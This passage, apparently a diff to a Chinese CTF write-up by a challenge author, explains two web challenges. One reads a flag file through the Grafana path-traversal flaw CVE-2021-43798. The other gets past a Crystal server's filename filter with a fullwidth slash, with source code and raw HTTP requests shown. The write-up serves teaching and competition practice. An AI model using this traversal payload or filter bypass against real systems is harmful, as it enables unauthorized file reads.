@@ -2,6 +2,188 @@
 
 # Web  
 
+##	真的签到 (28 solves)
+
+###	exp
+
+参考答案，请求：`/public/plugins/welcome/../../../../../../../../home/grafana/flag`
+
+###	考点
+
+作为从事信息安全方向的人员，不论是在哪一个企业，对于漏洞的敏感度都肯定需要异于常人，需要日常更新自己的漏洞库知识，哪怕有一点印象都可以，毕竟现在是互联网时代，详情可以在网络上搜索得到，获取信息不能太滞后。
+
+这个题主要是想考察信息安全的同学对于近期 Web 漏洞的关注度，这个 Web 漏洞就是 CVE-2021-43798 （这是一个漏洞编号），这个漏洞在 2021/12/07 号左右在互联网上被披露，NUAACTF 是 2021/12/11 ，日子比较接近，也符合我想考察地同学们对于 Web 漏洞跟进的能力。并且为了降低整体比赛难度，减轻同学们的压力，所以没有设置其他特别复杂的漏洞。
+
+（问题来了，为啥不用 12/09 晚上爆出的 Log4j 漏洞呢？因为忙不过来，环境弄不过来2333
+
+##	Make Me Cry (0 solves)
+
+###	exp
+
+参考答案，向 /flag 路由发送以下内容即可
+
+```
+POST /flag HTTP/1.1
+Host: 118.195.147.196:9216
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+
+/.／flag
+```
+
+###	解题步骤
+
+* 第一步，访问主页，我们可以看到主页列举了当前面目录下的一些文件，
+
+  ```
+  你好世界！我做了一个简单的服务器，我经常访问 /flag 路径来读取我需要的文件。这是我当前目录下的文件: ["main", "main.cr", "test.txt", "flag"]
+  ```
+
+* 根据题目的描述，我们知道 /flag 路径可能存在**任意文件读取漏洞**，那我们尝试访问 /flag 路径，得到提示
+
+  ```
+  你想要 FLAG 吗？尝试向我发送 POST 请求你想要读取的文件名吧，直接发送文件名噢，不需要其他参数。
+  ```
+
+* 所以根据描述，我们可以直接向该路由发送一个 POST 参数，例如我们先尝试读取 test.txt
+
+  ```http
+  POST /flag HTTP/1.1
+  Host: 118.195.147.196:9216
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 8
+  
+  test.txt
+  ```
+
+  我们可以得到 HTTP 响应：
+
+  ```http
+  HTTP/1.1 200 OK
+  Connection: keep-alive
+  Content-Type: text/plain; charset=utf-8
+  Content-Length: 87
+  
+  检查一下是否可以正常读取文件但是不能让坏家伙读我的小秘密。
+  ```
+
+* 尝试读取 flag 文件
+
+  ```http
+  POST /flag HTTP/1.1
+  Host: 118.195.147.196:9216
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 4
+  
+  flag
+  ```
+
+  得到如下 HTTP 响应，得知我们不能直接读取 flag ，所以我们可能得需要找个方法读取 flag
+
+  ```http
+  HTTP/1.1 200 OK
+  Connection: keep-alive
+  Content-Type: text/plain; charset=utf-8
+  Content-Length: 27
+  
+  You can't get flag directly
+  ```
+
+* 当然你可以尝试读取其他目录文件，比如 `/etc/passwd` ，但是读不了，这里就不做演示了，会提示没有找到该文件，我们这里直接读取 main.cr 代码。
+
+* 读取到代码之后就是代码审计的部分了，简单通过阅读了解，我们知道这是 crystal 语言写的 Web 服务，并且通过搜索，代码并不多，简单学习[ crystal 语言的文档](https://crystal-lang.org) 我们可以知道这是一个比较新兴的类 ruby 类型的语言。为了方便同学们理解代码，我简单写了一下注释
+
+```ruby
+# A very basic HTTP server
+require "http/server"
+def normalize(data)												#定义一个函数
+	tmp = ""													#定义一个变量
+	data.each_char do |char|									#对 data 这个字符串变量进行挨个循环处理
+		if 65374 >= char.ord >= 65281							#如果这个字符对应的十进制在 [65281,65374] 这个区间
+			tmp += (char.ord - 65248).chr						#进行减法，并再返回减法后对应的字符。并拼接上 tmp 变量原有的字符串
+		elsif 126 >= char.ord >= 33								#如果这个字符对应的十进制在 [33,126] 这个区间
+			tmp += char											#直接拼接上 tmp 变量原有的字符串
+		end
+	end
+	return tmp													#返回 tmp 字符串变量
+end
+
+server = HTTP::Server.new do |context|
+	context.response.content_type = "text/plain; charset=utf-8"	#设置 HTTP 响应头部
+	if context.request.path == "/flag"							#访问 /flag 路径做以下操作
+		if context.request.method == "POST"						#如果是 POST 请求做以下操作
+			begin												# begin 关键字是 crystal 错误捕捉机制，可以理解为 try/catch
+				filename = context.request.body.not_nil!.gets_to_end	#获取 POST 正文的内容
+				filename = File.basename filename				#将 filename 作为参数传递给 File.basename 函数，该函数用来获取基础文件名，例如传入 /etc/passwd 会返回 passwd
+				filename = normalize filename					#使用 normalize 函数对 filename 变量进行处理
+                if File.match?("*fl*", filename)				#使用 File.match 函数对 filename 变量进行 *fl* 正则匹配
+					context.response.print "You can't get flag directly"  #如果正则匹配上了对应内容，则返回错误的 HTTP 响应
+				else
+					data = File.read(filename)					#如果不匹配，则使用 File.read 函数读取对应的文件内容
+					context.response.print data					#将文件内容作为 HTTP 响应返回
+				end    
+			rescue
+				context.response.print "File not Found"			# rescue 关键字捕捉到错误后，则将这行字符串作为 HTTP 响应返回
+			end
+		else
+			context.response.print "你想要 FLAG 吗？尝试向我发送 POST 请求你想要读取的文件名吧，直接发送文件名噢，不需要其他参数。"
+		end
+	elsif context.request.path == "/"
+		dir = Dir.children("/app/").to_s
+		context.response.print "你好世界！我做了一个简单的服务器，我经常访问 /flag 路径来读取我需要的文件。这是我当前目录下的文件: " + dir
+	end
+end
+
+server.bind_tcp "0.0.0.0", 80	#让 HTTP 服务监听在 80 端口上
+server.listen					#启动 HTTP 服务
+```
+
+我们可以根据提示或者理解 `normalize` 函数知道，这个函数中对于十进制大于 65281 的处理，是为了解决全角字符的问题，这里使用了简单粗暴的方法，将全角字符转换成了半角字符，我们可以通过百度百科的表格看出来：https://baike.baidu.com/item/%E5%85%A8%E8%A7%92/9323113?fr=aladdin
+
+| **ASCII** | **全角字符** | **Unicode** | **半角字符** | **Unicode** |
+| --------- | ------------ | ----------- | ------------ | ----------- |
+| 0x2f      | /            | U+ff0f      | /            | U+002f      |
+
+上面这个例子，左边这个斜杠的全角字符 0xff0f 对应的十进制就是 65295 ，右边半角字符对应的则是 47 ，所以 65295-27=65248 ，所以正好是`normalize`函数使用的数值，就是为了将全角字符转换为半角字符。
+
+知道`normalize`函数具体用来干什么之后，我们回到正则表达式处的代码，这里使用`*fl*`，表示匹配中间有 fl 两个字符的所有字符串，比如 xflag / flag 等，如果匹配到了则会拒绝用户请求，匹配不上则会进行读取相应的文件。但是已知我们当前目录下存在 flag 文件，那么我们有没有办法，让这个正则表达式匹配不上，让其读取 flag 文件呢？
+
+阅读 `File.match` 这个函数文档，或者根据提示我们可以从文档中知道
+
+> \* matches an unlimited number of arbitrary characters excluding `/`
+>
+> Only `/` is recognized as path separator in both *pattern* and *path*.
+
+这句话的意思是，对于 * 星号来说，这里比较特殊，一般正则表达式星号会匹配任意字符，但是这里文档标明了，星号不会匹配斜杠这个字符，所以当我们如果传入`./flag`的时候，`File.match`这个函数就匹配不上了，就会进入到`File.read(filename)`函数进行文件读取，而`./flag`表示当前目录下的 flag 文件，所以就可以拿到 flag 了。
+
+看到这里你是不是以为就可以了呢？当你尝试使用`./flag`的时候会发现，`File.basename`将`./flag`转换成了`flag`去掉了我们后面需要的斜杠。
+
+看到这里你是不是以为又不可以了呢？我们看回`normalize`函数，并且注意到`File.basename`函数是在`normalize`函数之前，那我们是不是可以使用一个全角字符绕过`File.basename`函数呢？因为对于一般情况下来说，全角字符会被视为一般的字符串，比如上面的斜杠对应的全角字符，他在这里不会被视为斜杠，而会被视为一个普通的看起来像斜杠一样的字符串，所以`File.basename`不会将其视为半角的斜杠，就不会把他去掉了。
+
+然后经过`File.basename`处理后的全角字符会经过`normalize`函数变成半角字符的斜杠！这样传入到`File.match`函数的时候就是半角字符的斜杠了！我们就可以绕过正则表达式的检测了！好耶！
+
+所以我们直接复制全角字符的斜杠放到 burp 里面发送就好啦，是不是很简单呢？只需要一行代码哎
+
+![](https://s4.ax1x.com/2021/12/15/oxzjpT.png)
+
+
+
+###	考点
+
+* crystal lang 。新语言的快速学习能力以及查阅文档能力
+* 基础的正则表达式。
+* 代码审计能力
+
+这个题我的预期是校外队伍可能会有 1-5 支队伍应该可以做出来，校内比较悬，但是即使最后在给到了文档详细位置的地方还是没有人做出来让我有些意外。
+
+我认为代码审计能力对于任何一个方向的安全从业者来说，都是必备的能力之一；虽然这个 crystal lang 比较冷门，但是正是冷门，大家都没学过，才能考察出大家对于新语言的快速学习能力，文档阅读能力，我觉得这也是**竞赛**的目的之一，就是为了锻炼、考察选手的能力，而且这几个考点基本上都是阅读文档都能找到的，所以并不算特别的难（今后的竞赛道路还远呢，竞赛题会更险恶）。
+
+所以，我也希望大家在精进代码能力的同时，不要忘了语言毕竟是工具，吃透一门语言当然好，但是一门语言并不会永远都是热门，以后可能在工作、学习上需要你去接触其他语言，一些热门语言还好，有成熟的文档、完善的社区生态，要是冷门语言该怎么办？要是这个语言甚至没有文档怎么办？摆烂直接弃用当然是一种解决方式，但是如果真到了不能弃用的地步，那你会怎么去解决这个问题呢？
+
+题目归题目，希望大家在今后的竞赛生涯中，不要死背考点，真正的 CTF 并不像寻常考试一样会有一些常考的热门考点，反而更多偏向于考察选手快速学习的能力，出题人很有可能就像这个题一样出一个你从来没见过的东西，让你在短期学习掌握一些知识解决这个问题，这也是 CTF 的乐趣所在。
+
+Anyway，祝贺本次竞赛取得优异成绩的队伍，暂时落后的队伍也不必灰心，希望各位选手能从本次的竞赛中有所收获~
+
 # Misc
 
 ## 我们生活在南京（一）
